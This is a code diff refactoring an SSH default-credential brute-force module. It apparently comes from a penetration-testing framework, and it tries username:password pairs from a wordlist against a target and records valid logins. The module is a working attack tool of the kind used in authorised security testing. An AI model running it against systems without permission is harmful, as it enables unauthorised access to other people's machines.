@@ -23,8 +23,8 @@ class Exploit(SSHClient):
 
     defaults = OptWordlist(wordlists.defaults, "User:Pass or file with default credentials (file://)")
 
-    verbosity = OptBool(True, "Display authentication attempts")
     stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
+    verbosity = OptBool(True, "Display authentication attempts")
 
     def run(self):
         self.credentials = []
@@ -50,20 +50,21 @@ class Exploit(SSHClient):
     def target_function(self, running, data):
         while running.is_set():
             try:
-                username, password = data.next().split(":")
-                ssh = self.ssh_login(username, password)
-                if ssh:
+                username, password = data.next().split(":", 1)
+                ssh_client = self.ssh_create()
+                if ssh_client.login(username, password):
                     if self.stop_on_success:
                         running.clear()
 
                     self.credentials.append((self.target, self.port, self.target_protocol, username, password))
-                    ssh.close()
+                    ssh_client.close()
 
             except StopIteration:
                 break
 
     def check(self):
-        if self.ssh_test_connect():
+        ssh_client = self.ssh_create()
+        if ssh_client.test_connect():
             print_status("Target exposes SSH service", verbose=self.verbosity)
             return True
 
